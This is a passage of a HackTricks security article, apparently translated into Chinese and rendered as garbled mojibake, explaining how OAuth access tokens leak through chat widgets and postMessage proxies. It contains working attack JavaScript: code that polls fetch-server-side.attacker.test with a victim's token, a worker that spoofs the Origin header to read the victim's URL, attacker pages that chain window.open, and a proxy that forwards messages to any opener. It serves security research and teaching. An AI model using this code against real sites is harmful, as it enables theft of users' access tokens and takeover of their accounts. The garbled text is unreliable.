4. å½“å—å®³è€…ç‚¹å‡»é“¾æ¥å¹¶æœ€ç»ˆè¿›å…¥å¸¦æœ‰ä»¤ç‰Œçš„é”™è¯¯é¡µé¢æ—¶ï¼ŒèŠå¤©å°†å¯åŠ¨å¹¶åˆ›å»ºä¸€ä¸ªchat-api-tokenã€‚æˆ‘åœ¨æ¶æ„é¡µé¢ä¸Šé‡æ–°åŠ è½½èŠå¤©å°éƒ¨ä»¶çš„iframeå°†é€šè¿‡postMessageè·å–`api-token`ï¼Œç„¶åæˆ‘å¯ä»¥å¼€å§‹åœ¨APIä¸­æŸ¥æ‰¾å—å®³è€…çš„å½“å‰URLï¼š

```javascript
function lookInApi(token) {
var look = setInterval(function() {
fetch('https://fetch-server-side.attacker.test/?token=' + token).then(e => e.json()).then(e => {
if (e &&
e.api_data &&
e.api_data.current_url &&
e.api_data.current_url.indexOf('access_token') !== -1) {
var payload = e.api_data.current_url
document.getElementById('leak').innerHTML = 'æ”»å‡»è€…ç°åœ¨æ‹¥æœ‰ä»¤ç‰Œï¼š' + payload;
clearInterval(look);
}
});
}, 2000);
}
```
5. `https://fetch-server-side.attacker.test/?token=xxx`ä¸Šçš„æœåŠ¡å™¨ç«¯é¡µé¢å°†ä½¿ç”¨æ·»åŠ çš„Originæ ‡å¤´è¿›è¡ŒAPIè°ƒç”¨ï¼Œä½¿Chat-APIè®¤ä¸ºæˆ‘æ­£åœ¨ä½¿ç”¨å®ƒä½œä¸ºåˆæ³•çš„æ¥æºï¼š

```javascript
addEventListener('fetch', event => {
event.respondWith(handleRequest(event.request))
})
async function getDataFromChatApi(token) {
return await fetch('https://chat-widget.example.com/api', {headers:{Origin: 'https://example.com', 'Chat-Api-Token': token}});
}
function handleRequest(request) {
const token = request.url.match('token=([^&#]+)')[1] || null;
return token ? getDataFromChatApi(token) : null;
}
```
6. å½“å—å®³è€…ç‚¹å‡»é“¾æ¥å¹¶å®ŒæˆOAuthæµç¨‹ï¼Œå¹¶åœ¨å¸¦æœ‰ä»¤ç‰Œçš„é”™è¯¯é¡µé¢ä¸Šç€é™†æ—¶ï¼ŒèŠå¤©å°éƒ¨ä»¶å°†çªç„¶å¼¹å‡ºï¼Œæ³¨å†Œå½“å‰URLï¼Œæ”»å‡»è€…å°†è·å¾—å—å®³è€…çš„è®¿é—®ä»¤ç‰Œã€‚

## æ³„éœ²URLçš„å…¶ä»–æƒ³æ³•

ä»ç„¶æœ‰å…¶ä»–ä¸åŒç±»å‹çš„å°å·¥å…·ç­‰å¾…è¢«å‘ç°ã€‚ä»¥ä¸‹æ˜¯æˆ‘åœ¨é‡å¤–æ— æ³•æ‰¾åˆ°ä½†å¯èƒ½æ˜¯æ½œåœ¨çš„ä½¿ç”¨ä»»ä½•å¯ç”¨çš„å“åº”æ¨¡å¼æ³„éœ²URLçš„æ–¹æ³•ä¹‹ä¸€ã€‚

### åœ¨å°†ä»»ä½•postMessageè·¯ç”±åˆ°å…¶openerçš„åŸŸä¸Šçš„é¡µé¢

ç”±äºæ‰€æœ‰`web_message`å“åº”ç±»å‹æ— æ³•éªŒè¯æ¥æºçš„ä»»ä½•è·¯å¾„ï¼Œå› æ­¤ä»»ä½•æœ‰æ•ˆåŸŸä¸Šçš„URLéƒ½å¯ä»¥æ¥æ”¶å¸¦æœ‰ä»¤ç‰Œçš„postMessageã€‚å¦‚æœåœ¨åŸŸä¸Šçš„ä»»ä½•é¡µé¢ä¸Šå­˜åœ¨æŸç§å½¢å¼çš„postMessageç›‘å¬å™¨ä»£ç†ï¼Œè¯¥ä»£ç†æ¥æ”¶å‘é€åˆ°å®ƒçš„ä»»ä½•æ¶ˆæ¯å¹¶å°†æ‰€æœ‰å†…å®¹å‘é€åˆ°å…¶`opener`ï¼Œæˆ‘å¯ä»¥åˆ›å»ºä¸€ä¸ªåŒé‡window.opené“¾ï¼š

æ”»å‡»è€…é¡µé¢1ï¼š
```html
<a href="#" onclick="a=window.open('attacker2.html'); return false;">Accept cookies</a>
```
æ”»å‡»è€…é¡µé¢ 2:
```html
<a href="#" onclick="b=window.open('https://accounts.google.com/oauth/...?', '', 'x'); location.href = 'https://example.com/postmessage-proxy'; return false;">Login to google</a>
```
è€Œ `https://example.com/postmessage-proxy` å°†ä¼šæœ‰ä»¥ä¸‹å†…å®¹ï¼š
```javascript
// Proxy all my messages to my opener:
window.onmessage=function(e) { opener.postMessage(e.data, '*'); }
```
æˆ‘å¯ä»¥ä½¿ç”¨ä»»ä½•`web_message`å“åº”æ¨¡å¼å°†ä»¤ç‰Œä»OAuthæä¾›ç¨‹åºæäº¤åˆ°`https://example.com`çš„æœ‰æ•ˆæ¥æºï¼Œä½†æ˜¯è¯¥ç«¯ç‚¹å°†è¿›ä¸€æ­¥å°†ä»¤ç‰Œå‘é€ç»™`opener`ï¼Œå³æ”»å‡»è€…çš„é¡µé¢ã€‚

è¿™ä¸ªæµç¨‹å¯èƒ½çœ‹èµ·æ¥ä¸å¤ªå¯èƒ½ï¼Œå¹¶ä¸”éœ€è¦ä¸¤æ¬¡ç‚¹å‡»ï¼šä¸€æ¬¡åˆ›å»ºæ”»å‡»è€…å’Œç½‘ç«™ä¹‹é—´çš„openerå…³ç³»ï¼Œç¬¬äºŒæ¬¡å¯åŠ¨ä»¥åˆæ³•ç½‘ç«™ä½œä¸ºOAuthå¼¹å‡ºçª—å£çš„openerçš„OAuthæµç¨‹ã€‚

OAuthæä¾›ç¨‹åºå°†ä»¤ç‰Œå‘é€åˆ°åˆæ³•æ¥æºï¼š

![](https://labs.detectify.com/wp-content/uploads/2022/06/gadget4-example1.png)

åˆæ³•æ¥æºå…·æœ‰å°†postMessageä»£ç†å‘é€åˆ°å…¶openerçš„åŠŸèƒ½ï¼š

![](https://labs.detectify.com/wp-content/uploads/2022/06/gadget4-example2.png)

è¿™å¯¼è‡´æ”»å‡»è€…è·å–ä»¤ç‰Œï¼š

![](https://labs.detectify.com/wp-content/uploads/2022/06/gadget4-example3.png)

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>â˜ï¸ HackTricks Cloud â˜ï¸</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>ğŸ¦ Twitter ğŸ¦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>ğŸ™ï¸ Twitch ğŸ™ï¸</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>ğŸ¥ Youtube ğŸ¥</strong></a></summary>

* ä½ åœ¨ä¸€å®¶**ç½‘ç»œå®‰å…¨å…¬å¸**å·¥ä½œå—ï¼Ÿæƒ³è¦åœ¨HackTricksä¸­**å®£ä¼ ä½ çš„å…¬å¸**å—ï¼Ÿæˆ–è€…æƒ³è¦**è·å–PEASSçš„æœ€æ–°ç‰ˆæœ¬æˆ–ä¸‹è½½PDFæ ¼å¼çš„HackTricks**å—ï¼Ÿè¯·æŸ¥çœ‹[**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)ï¼
* å‘ç°æˆ‘ä»¬çš„ç‹¬å®¶[NFTæ”¶è—å“](https://opensea.io/collection/the-peass-family)â€”â€”[**The PEASS Family**](https://opensea.io/collection/the-peass-family)
* è·å¾—[**å®˜æ–¹PEASSå’ŒHackTrickså‘¨è¾¹äº§å“**](https://peass.creator-spring.com)
* **åŠ å…¥**[**ğŸ’¬**](https://emojipedia.org/speech-balloon/) [**Discordç¾¤ç»„**](https://discord.gg/hRep4RUj7f)æˆ–[**ç”µæŠ¥ç¾¤ç»„**](https://t.me/peass)ï¼Œæˆ–åœ¨**Twitter**ä¸Š**å…³æ³¨**æˆ‘[**ğŸ¦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**ã€‚**
* **é€šè¿‡å‘**[**hacktricks repo**](https://github.com/carlospolop/hacktricks) **å’Œ**[**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **æäº¤PRæ¥åˆ†äº«ä½ çš„é»‘å®¢æŠ€å·§ã€‚**

</details>
